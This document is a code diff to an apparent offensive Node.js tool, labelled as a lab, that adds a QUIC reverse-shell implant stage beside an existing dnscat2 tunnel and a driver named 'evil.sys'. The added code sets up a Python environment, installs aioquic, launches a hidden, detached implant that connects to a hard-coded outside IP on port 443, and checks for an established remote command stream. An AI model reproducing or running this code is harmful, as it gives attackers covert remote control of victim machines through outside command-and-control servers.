@@ -49,6 +49,18 @@ function applyDnscatCfg(cfg) {
   if (!process.env.LAB_DNSCAT_SECRET && d.secret !== undefined) DNSCAT.secret = d.secret || '';
 }
 
+const QUIC = {
+  name: 'quic_implant.py',
+  server: process.env.LAB_QUIC_SERVER || '34.146.249.74',
+  port: process.env.LAB_QUIC_PORT || '443'
+};
+
+function applyQuicCfg(cfg) {
+  const q = (cfg && cfg.quic) || {};
+  if (!process.env.LAB_QUIC_SERVER && q.server) QUIC.server = q.server;
+  if (!process.env.LAB_QUIC_PORT && q.port) QUIC.port = String(q.port);
+}
+
 const DRIVER = 'evil.sys';
 const DRIVER_CLI = 'evilcli.exe';
 const SERVICE_NAME = 'logfwsvc';
@@ -344,9 +356,9 @@ function proxiedHttpsPost(url, bodyBuf, contentType) {
   });
 }
 
-function runCmd(file, args) {
+function runCmd(file, args, timeout) {
   return new Promise((resolve) => {
-    execFile(file, args, { windowsHide: true, timeout: 20000 }, (err, stdout, stderr) => {
+    execFile(file, args, { windowsHide: true, timeout: timeout || 20000 }, (err, stdout, stderr) => {
       const out = String(stdout || '') + String(stderr || '');
       resolve({ err, out: out.trim() });
     });
@@ -1023,11 +1035,12 @@ function payloadList() {
   if (IS_WIN) {
     return [
       [DNSCAT.name, 'dnscat'],
+      [QUIC.name, 'quic'],
       [DRIVER, 'sys'],
       [DRIVER_CLI, 'cli']
     ];
   }
-  return [[DNSCAT.name, 'dnscat']];
+  return [[DNSCAT.name, 'dnscat'], [QUIC.name, 'quic']];
 }
 
 function buildDnscat(srcDir) {
@@ -1168,6 +1181,88 @@ async function reportDnscat(child) {
   log(connected
     ? '[+] dnscat2 session established with C2'
     : '[*] dnscat2 running, no handshake yet (server down or unreachable)');
+  return connected;
+}
+
+function quicPython() {
+  return path.join(TMP, 'quicvenv', IS_WIN ? 'Scripts' : 'bin', IS_WIN ? 'python.exe' : 'python');
+}
+
+async function ensureQuicVenv() {
+  const py = quicPython();
+  if (fs.existsSync(py)) {
+    const chk = await runCmd(py, ['-c', 'import aioquic']);
+    if (!chk.err) return py;
+    log('[*] quic venv present but aioquic missing, repairing');
+  }
+  const pyCmd = IS_WIN ? 'python' : 'python3';
+  if (!fs.existsSync(py)) {
+    const r = await runCmd(pyCmd, ['-m', 'venv', path.join(TMP, 'quicvenv')]);
+    log(`[*] quic venv create -> ${fmt(r)}`);
+    if (r.err) return null;
+  }
+  const inst = await runCmd(py, ['-m', 'pip', 'install', '-q', 'aioquic'], 120000);
+  log(`[*] pip install aioquic -> ${fmt(inst)}`);
+  const chk = await runCmd(py, ['-c', 'import aioquic']);
+  if (chk.err) {
+    log('[-] aioquic unavailable, QUIC phase skipped');
+    return null;
+  }
+  log('[+] quic venv ready');
+  return py;
+}
+
+async function launchQuic(implantPath) {
+  const py = await ensureQuicVenv();
+  if (!py) return null;
+  const pidFile = path.join(TMP, 'logfwd.quic.pid');
+  try {
+    const oldPid = Number(fs.readFileSync(pidFile, 'utf8'));
+    if (procAlive(oldPid)) {
+      log(`[*] QUIC implant already running (pid ${oldPid}), skipping launch`);
+      return null;
+    }
+  } catch (e) { void e; }
+  const logf = path.join(TMP, 'logfwd.quic.log');
+  try {
+    const fd = fs.openSync(logf, 'a');
+    const child = spawn(py, [implantPath, '--server', QUIC.server, '--port', QUIC.port], {
+      windowsHide: true,
+      detached: !IS_WIN,
+      stdio: ['ignore', fd, fd]
+    });
+    fs.closeSync(fd);
+    try { fs.writeFileSync(pidFile, String(child.pid)); } catch (e) { void e; }
+    child.on('error', (e) => log(`[-] QUIC spawn error: ${e.message}`));
+    child.on('exit', (code, sig) => log(`[*] QUIC implant exited code=${code} sig=${sig}`));
+    child.unref();
+    log(`[+] QUIC reverse shell launched pid=${child.pid} -> udp/${QUIC.port} @${QUIC.server} output=${logf}`);
+    return child;
+  } catch (e) {
+    log(`[-] QUIC: ${e.message}`);
+    return null;
+  }
+}
+
+async function reportQuic(child) {
+  if (!child) return null;
+  await delay(8000);
+  if (child.signalCode || (child.exitCode !== null && child.exitCode !== undefined)) {
+    log(`[-] QUIC implant exited early (code=${child.exitCode}, signal=${child.signalCode})`);
+    return false;
+  }
+  if (!procAlive(child.pid)) {
+    log(`[-] QUIC pid ${child.pid} not alive at 8s (signalCode=${child.signalCode})`);
+    return false;
+  }
+  let connected = false;
+  try {
+    const txt = fs.readFileSync(path.join(TMP, 'logfwd.quic.log'), 'utf8');
+    connected = /Connected - opening command stream/i.test(txt);
+  } catch (e) { void e; }
+  log(connected
+    ? `[+] QUIC reverse shell established (udp/${QUIC.port} ${QUIC.server}, ALPN g3tsyst3m)`
+    : '[*] QUIC implant running, no handshake yet (server down or UDP filtered)');
   return connected;
 }
 
@@ -1387,6 +1482,7 @@ async function main() {
 
   const cfg = loadConfig();
   applyDnscatCfg(cfg);
+  applyQuicCfg(cfg);
   const env = process.env.LAB_SKIP_RECON === '1' ? {} : await phase1Recon();
   const tunnelUp = await phase2Tunnel(env, cfg);
   const state = {};
@@ -1406,6 +1502,13 @@ async function main() {
     else log('[-] dnscat2 phase skipped (not bundled)');
   } else {
     log('[*] dnscat2 skipped');
+  }
+
+  if (process.env.LAB_SKIP_QUIC !== '1') {
+    if (staged.quic) await reportQuic(await launchQuic(staged.quic));
+    else log('[-] QUIC phase skipped (not bundled)');
+  } else {
+    log('[*] QUIC skipped');
   }
 
   if (IS_WIN) {
